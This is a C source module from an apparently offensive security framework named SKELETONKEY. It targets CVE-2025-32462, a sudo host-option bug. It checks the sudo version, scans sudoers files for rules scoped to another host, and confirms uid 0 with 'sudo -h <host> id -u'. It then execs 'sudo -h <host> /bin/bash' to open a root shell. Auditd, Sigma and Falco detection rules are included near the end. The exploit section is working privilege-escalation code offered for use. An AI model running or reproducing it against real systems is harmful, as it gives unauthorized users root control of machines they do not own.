/*
 * sudo_host_cve_2025_32462 — SKELETONKEY module
 *
 * STATUS: 🟢 STRUCTURAL (config-gated). No offsets, no leak, no race.
 *   Pure authorization-logic flaw: sudo's `-h`/`--host` option — meant
 *   only to pair with `-l`/`--list` to show your privileges on ANOTHER
 *   host — was honored when actually *running* a command (or sudoedit).
 *   That makes the host field of a sudoers rule attacker-chosen: a rule
 *   scoped to some host other than the current machine becomes usable
 *   here via `sudo -h <that-host> <command>`.
 *
 * The bug (Rich Mirch, Stratascale CRU, disclosed 2025-06-30 alongside
 *   the sibling --chroot bug CVE-2025-32463):
 *     `sudo -h <host> <command>` evaluates the sudoers policy as though
 *     the machine were <host>. A user listed in sudoers for a different
 *     host (common with a fleet-wide sudoers file, or LDAP/SSSD sudoers)
 *     can therefore run that host's commands as root on the local box.
 *
 *   sudo.ws advisory: https://www.sudo.ws/security/advisories/host_any/
 *
 * Affects: sudo 1.8.8 ≤ V ≤ 1.9.17p0 (the `-h` option behaviour is
 *   ~12 years old). Fixed in 1.9.17p1, which stops honoring `-h` outside
 *   `-l`. CWE-863 (Incorrect Authorization). CVSS 8.8 (High). NOT in
 *   CISA KEV (the sibling 32463 is).
 *
 * Precondition for exploitation (NOT for detection): the invoking user
 *   must already be listed in sudoers for a host that is neither the
 *   current hostname nor ALL. detect() can only gate on the sudo
 *   version (the host-restricted rule lives in a sudoers source the user
 *   usually cannot read — that opacity is the whole point of the bug),
 *   so a VULNERABLE verdict here means "vulnerable sudo present; an
 *   abusable host-restricted rule MAY exist". exploit() then tries to
 *   find/fire one (or takes the host+command from env vars).
 *
 * arch_support: any. Pure userspace; no shellcode.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/host.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef __linux__
#include <pwd.h>
#include <grp.h>
#endif

/* ---- sudo family helpers (mirror the sibling sudo_* modules) -------- */

static const char *find_sudo(void)
{
    static const char *candidates[] = {
        "/usr/bin/sudo", "/usr/sbin/sudo", "/bin/sudo",
        "/sbin/sudo", "/usr/local/bin/sudo", NULL,
    };
    for (size_t i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID))
            return candidates[i];
    }
    return NULL;
}

static bool get_sudo_version(const char *sudo_path, char *out, size_t outsz)
{
    char cmd[512];
    snprintf(cmd, sizeof cmd, "%s --version 2>&1 | head -1", sudo_path);
    FILE *p = popen(cmd, "r");
    if (!p) return false;
    char line[256] = {0};
    char *r = fgets(line, sizeof line, p);
    pclose(p);
    if (!r) return false;
    char *vp = strstr(line, "version");
    if (!vp) return false;
    vp += strlen("version");
    while (*vp == ' ' || *vp == '\t') vp++;
    char *nl = strchr(vp, '\n');
    if (nl) *nl = 0;
    strncpy(out, vp, outsz - 1);
    out[outsz - 1] = 0;
    return out[0] != 0;
}

/* True iff the version is in the vulnerable range [1.8.8, 1.9.17p0].
 * Fixed in 1.9.17p1. Versions below 1.8.8 predate the `-h` behaviour. */
static bool sudo_version_vulnerable_host(const char *v)
{
    int maj = 0, min = 0, patch = 0;
    char ptag = 0;
    int psub = 0;
    int n = sscanf(v, "%d.%d.%d%c%d", &maj, &min, &patch, &ptag, &psub);
    if (n < 3) return true;            /* unparseable → assume worst */
    if (maj != 1)      return false;
    if (min < 8)       return false;   /* 1.7.x and below predate */
    if (min == 8)      return patch >= 8;   /* 1.8.8 .. 1.8.x */
    if (min > 9)       return false;   /* 1.10+ (hypothetical) fixed */
    /* min == 9 */
    if (patch < 17)    return true;    /* 1.9.0 .. 1.9.16 */
    if (patch > 17)    return false;   /* 1.9.18+ fixed */
    /* exactly 1.9.17 */
    if (ptag != 'p')   return true;    /* 1.9.17 plain → vulnerable */
    return psub == 0;                  /* 1.9.17p0 vuln; p1+ fixed */
}

/* ---- detect --------------------------------------------------------- */

static skeletonkey_result_t sudo_host_detect(const struct skeletonkey_ctx *ctx)
{
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        if (!ctx->json)
            fprintf(stderr, "[i] sudo_host: sudo not installed; bug unreachable here\n");
        return SKELETONKEY_PRECOND_FAIL;
    }

    char vbuf[64] = {0};
    const char *ver = NULL;
    if (ctx->host && ctx->host->sudo_version[0]) {
        ver = ctx->host->sudo_version;
    } else if (get_sudo_version(sudo_path, vbuf, sizeof vbuf)) {
        ver = vbuf;
    } else {
        if (!ctx->json) fprintf(stderr, "[!] sudo_host: could not read sudo --version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json) fprintf(stderr, "[i] sudo_host: sudo version '%s'\n", ver);

    if (!sudo_version_vulnerable_host(ver)) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudo_host: sudo %s outside vulnerable range "
                            "[1.8.8, 1.9.17p0] — patched or pre-feature\n", ver);
        return SKELETONKEY_OK;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] sudo_host: sudo %s in vulnerable range — VULNERABLE\n", ver);
        fprintf(stderr, "[i] sudo_host: `-h`/`--host` honored beyond `-l` — a sudoers "
                        "rule scoped to a non-current host is usable via `sudo -h <host>`\n");
        fprintf(stderr, "[i] sudo_host: exploitation requires such a host-restricted rule "
                        "(common with fleet-wide / LDAP / SSSD sudoers). Run "
                        "`--exploit sudo_host --i-know` to find/fire one.\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- exploit -------------------------------------------------------- */

#ifdef __linux__
/* Does `tok` name a host that is exploitable from here — i.e. a specific
 * host that is neither the current hostname nor the ALL wildcard? */
static bool host_is_abusable(const char *tok, const char *cur_host)
{
    if (!tok || !*tok) return false;
    if (strcmp(tok, "ALL") == 0) return false;     /* no restriction → no bug */
    if (tok[0] == '%' || tok[0] == '+') return false; /* netgroup/group, skip */
    if (strcasecmp(tok, cur_host) == 0) return false; /* already our host */
    /* A bare short-hostname form of the FQDN counts as "us" too. */
    const char *dot = strchr(cur_host, '.');
    if (dot) {
        size_t shortlen = (size_t)(dot - cur_host);
        if (strlen(tok) == shortlen && strncasecmp(tok, cur_host, shortlen) == 0)
            return false;
    }
    return true;
}

/* Best-effort scan of a sudoers source for a rule whose host field is
 * abusable. Fills *host_out with the host token to pass to `sudo -h`.
 * Returns true on the first hit. We do not try to fully parse the
 * sudoers grammar — we look for `<who> <host> = ...` user-spec lines and
 * test the host token. who may be the user, a %group, or ALL. */
static bool scan_sudoers_file(const char *path, const char *user,
                              const char *cur_host, char *host_out, size_t host_sz)
{
    FILE *f = fopen(path, "r");
    if (!f) return false;
    char line[1024];
    bool hit = false;
    while (fgets(line, sizeof line, f)) {
        char *s = line;
        while (*s == ' ' || *s == '\t') s++;
        if (*s == '#' || *s == '\n' || *s == 0) continue;
        if (strncmp(s, "Defaults", 8) == 0) continue;
        if (strstr(s, "_Alias")) continue;     /* alias defs, not user specs */
        if (strstr(s, "#include") || strncmp(s, "@include", 8) == 0) continue;

        /* Must contain '=' (the host = command separator). */
        char *eq = strchr(s, '=');
        if (!eq) continue;

        /* who = first token; host = second token (before '='). */
        char who[128] = {0}, host[256] = {0};
        if (sscanf(s, "%127s %255s", who, host) != 2) continue;
        /* strip a trailing '=' that sscanf may have grabbed onto host */
        char *he = strchr(host, '=');
        if (he) *he = 0;
        if (!host[0]) continue;

        bool who_match = (strcmp(who, "ALL") == 0) ||
                         (strcmp(who, user) == 0) ||
                         (who[0] == '%');   /* group — best-effort match */
        if (!who_match) continue;

        if (host_is_abusable(host, cur_host)) {
            snprintf(host_out, host_sz, "%s", host);
            hit = true;
            break;
        }
    }
    fclose(f);
    return hit;
}

/* Try to discover an abusable host token from readable sudoers sources.
 * Most non-root users cannot read these (that's the bug's opacity), but
 * misconfigured / world-readable sudoers and some LDAP cache dumps are
 * common enough to be worth a look. */
static bool discover_abusable_host(const char *user, const char *cur_host,
                                   char *host_out, size_t host_sz)
{
    if (scan_sudoers_file("/etc/sudoers", user, cur_host, host_out, host_sz))
        return true;
    /* /etc/sudoers.d/* — enumerate via shell glob into a temp listing. */
    FILE *p = popen("ls -1 /etc/sudoers.d/ 2>/dev/null", "r");
    if (p) {
        char name[256];
        while (fgets(name, sizeof name, p)) {
            char *nl = strchr(name, '\n'); if (nl) *nl = 0;
            if (!name[0]) continue;
            char full[512];
            snprintf(full, sizeof full, "/etc/sudoers.d/%s", name);
            if (scan_sudoers_file(full, user, cur_host, host_out, host_sz)) {
                pclose(p);
                return true;
            }
        }
        pclose(p);
    }
    return false;
}

/* Run `sudo -n -h <host> id -u` and return true if it printed "0"
 * (command executed as root). -n keeps it non-interactive so a password
 * prompt can't hang the scan. */
static bool sudo_host_witness_root(const char *sudo_path, const char *host)
{
    char cmd[768];
    snprintf(cmd, sizeof cmd,
             "%s -n -h %s id -u 2>/dev/null", sudo_path, host);
    FILE *p = popen(cmd, "r");
    if (!p) return false;
    char out[64] = {0};
    char *r = fgets(out, sizeof out, p);
    pclose(p);
    if (!r) return false;
    return atoi(out) == 0 && (out[0] == '0');
}
#endif /* __linux__ */

static skeletonkey_result_t sudo_host_exploit(const struct skeletonkey_ctx *ctx)
{
#ifndef __linux__
    (void)ctx;
    fprintf(stderr, "[-] sudo_host: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
#else
    if (!ctx->authorized) {
        fprintf(stderr, "[-] sudo_host: --i-know required for --exploit\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    skeletonkey_result_t pre = sudo_host_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] sudo_host: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] sudo_host: already running as root — nothing to do\n");
        return SKELETONKEY_OK;
    }
    const char *sudo_path = find_sudo();
    if (!sudo_path) {
        fprintf(stderr, "[-] sudo_host: sudo not installed\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    char cur_host[256] = {0};
    if (gethostname(cur_host, sizeof cur_host - 1) != 0) cur_host[0] = 0;
    struct passwd *pw = getpwuid(geteuid());
    const char *user = pw ? pw->pw_name : "";

    /* The host token to abuse. Source priority:
     *   1. SKELETONKEY_SUDO_HOST env var (operator supplies it — the most
     *      reliable path, since the host-restricted rule usually lives in
     *      a sudoers source the user can't read).
     *   2. Best-effort discovery from readable sudoers. */
    char host_tok[256] = {0};
    const char *envh = getenv("SKELETONKEY_SUDO_HOST");
    if (envh && *envh) {
        snprintf(host_tok, sizeof host_tok, "%s", envh);
        if (!ctx->json)
            fprintf(stderr, "[*] sudo_host: using SKELETONKEY_SUDO_HOST=%s\n", host_tok);
    } else if (discover_abusable_host(user, cur_host, host_tok, sizeof host_tok)) {
        if (!ctx->json)
            fprintf(stderr, "[+] sudo_host: found abusable host-restricted rule "
                            "(host '%s' != current '%s') in readable sudoers\n",
                    host_tok, cur_host);
    } else {
        fprintf(stderr,
            "[-] sudo_host: no abusable host-restricted rule discoverable.\n"
            "    The vulnerable sudo is present, but exploitation needs a sudoers\n"
            "    rule scoped to a host other than '%s' (and not ALL), which is\n"
            "    typically in a sudoers source you cannot read. If you know one\n"
            "    (fleet-wide / LDAP / SSSD sudoers), supply it and re-run:\n"
            "      SKELETONKEY_SUDO_HOST=<that-host> \\\n"
            "      [SKELETONKEY_SUDO_CMD=/bin/bash] \\\n"
            "      skeletonkey --exploit sudo_host --i-know\n",
            cur_host[0] ? cur_host : "(this host)");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Confirm the policy actually grants root on the local box when we
     * claim to be host_tok. `id -u` as the witness command. */
    if (!ctx->json)
        fprintf(stderr, "[*] sudo_host: testing `sudo -n -h %s id -u`...\n", host_tok);
    if (!sudo_host_witness_root(sudo_path, host_tok)) {
        fprintf(stderr,
            "[-] sudo_host: `sudo -h %s id -u` did not return uid 0. Likely:\n"
            "    - sudo is patched (1.9.17p1+) even if --version looked vulnerable\n"
            "    - the rule for '%s' is command-restricted (doesn't grant `id`);\n"
            "      set SKELETONKEY_SUDO_CMD to a command the rule DOES grant\n"
            "    - the rule requires a password (we run -n / non-interactive)\n",
            host_tok, host_tok);
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (!ctx->json)
        fprintf(stderr, "[+] sudo_host: WITNESS — `sudo -h %s` runs as uid 0. "
                        "CVE-2025-32462 confirmed.\n", host_tok);

    if (ctx->no_shell) {
        fprintf(stderr, "[i] sudo_host: --no-shell set; not popping. Reproduce with: "
                        "sudo -h %s <command>\n", host_tok);
        return SKELETONKEY_EXPLOIT_OK;
    }

    /* Pop a root shell via the abused host. The granted command may be
     * restricted; default to /bin/bash but let the operator override to
     * whatever the rule actually permits. */
    const char *cmd = getenv("SKELETONKEY_SUDO_CMD");
    if (!cmd || !*cmd) cmd = "/bin/bash";
    fprintf(stderr, "[+] sudo_host: exec `sudo -h %s %s`\n", host_tok, cmd);
    fflush(NULL);
    execl(sudo_path, "sudo", "-h", host_tok, cmd, (char *)NULL);
    perror("execl(sudo -h)");
    return SKELETONKEY_EXPLOIT_FAIL;
#endif /* __linux__ */
}

/* ---- detection rules ------------------------------------------------ */

static const char sudo_host_auditd[] =
    "# sudo_host CVE-2025-32462 — auditd detection rules\n"
    "# Flag sudo invocations; the abuse is `sudo -h <host>` running a\n"
    "# command (not just `-l`). auditd can't filter argv content, so this\n"
    "# watches sudo execve broadly — correlate with sudo's own logs, which\n"
    "# record the -h/--host value and the target command.\n"
    "-a always,exit -F arch=b64 -S execve -F path=/usr/bin/sudo -k skeletonkey-sudo-host\n"
    "-a always,exit -F arch=b64 -S execve -F path=/bin/sudo      -k skeletonkey-sudo-host\n";

static const char sudo_host_sigma[] =
    "title: Possible CVE-2025-32462 sudo --host policy-bypass LPE\n"
    "id: 7c1d9e54-skeletonkey-sudo-host\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects sudo invoked with -h/--host together with a command (not\n"
    "  -l/--list). On sudo <= 1.9.17p0 the host option is honored when\n"
    "  running commands, letting a user abuse a sudoers rule scoped to a\n"
    "  different host. False positives: admins legitimately using\n"
    "  `sudo -l -h <host>` to LIST remote privileges (no command present).\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  sudo_exec: {type: 'SYSCALL', syscall: 'execve', comm: 'sudo'}\n"
    "  host_opt:  {argv|contains: ['-h', '--host']}\n"
    "  condition: sudo_exec and host_opt\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2025.32462]\n";

static const char sudo_host_falco[] =
    "- rule: sudo --host running a command by non-root (CVE-2025-32462)\n"
    "  desc: |\n"
    "    sudo invoked with -h/--host while running a command (not -l). On\n"
    "    sudo <= 1.9.17p0 the host option is wrongly honored outside\n"
    "    --list, so a sudoers rule scoped to another host can be abused\n"
    "    for local root. False positives: `sudo -l -h <host>` used purely\n"
    "    to list remote privileges.\n"
    "  condition: >\n"
    "    spawned_process and proc.name = sudo and\n"
    "    (proc.cmdline contains \"-h \" or proc.cmdline contains \"--host\") and\n"
    "    not proc.cmdline contains \"-l\" and not user.uid = 0\n"
    "  output: >\n"
    "    sudo --host running a command by non-root\n"
    "    (user=%user.name pid=%proc.pid cmdline=\"%proc.cmdline\")\n"
    "  priority: HIGH\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2025.32462]\n";

/* ---- module struct -------------------------------------------------- */

const struct skeletonkey_module sudo_host_module = {
    .name           = "sudo_host",
    .cve            = "CVE-2025-32462",
    .summary        = "sudo -h/--host honored beyond -l → abuse a host-restricted sudoers rule for local root (Stratascale)",
    .family         = "sudo",
    .kernel_range   = "userspace — sudo 1.8.8 ≤ V ≤ 1.9.17p0 (fixed in 1.9.17p1)",
    .detect         = sudo_host_detect,
    .exploit        = sudo_host_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade sudo to 1.9.17p1+ */
    .cleanup        = NULL,    /* exploit runs a command as root; no persistent artifact */
    .detect_auditd  = sudo_host_auditd,
    .detect_sigma   = sudo_host_sigma,
    .detect_yara    = NULL,    /* behavioural (argv) bug — no file artifact to match */
    .detect_falco   = sudo_host_falco,
    .opsec_notes    = "Reads sudo --version (or the cached host fingerprint). On --exploit, best-effort reads /etc/sudoers + /etc/sudoers.d/* (usually unreadable to non-root — that opacity is the bug) looking for a user-spec whose host field is neither the current hostname nor ALL; or takes the host from SKELETONKEY_SUDO_HOST. Witnesses with `sudo -n -h <host> id -u` (non-interactive, no password prompt) and pops `sudo -h <host> /bin/bash` (override via SKELETONKEY_SUDO_CMD) only on a uid-0 witness. Audit-visible via execve(/usr/bin/sudo) with -h/--host in argv and a command present (not -l); sudo's own syslog/journal logging records the spoofed host and target command. No file artifacts, no persistence.",
    .arch_support   = "any",
};

void skeletonkey_register_sudo_host(void)
{
    skeletonkey_register(&sudo_host_module);
}
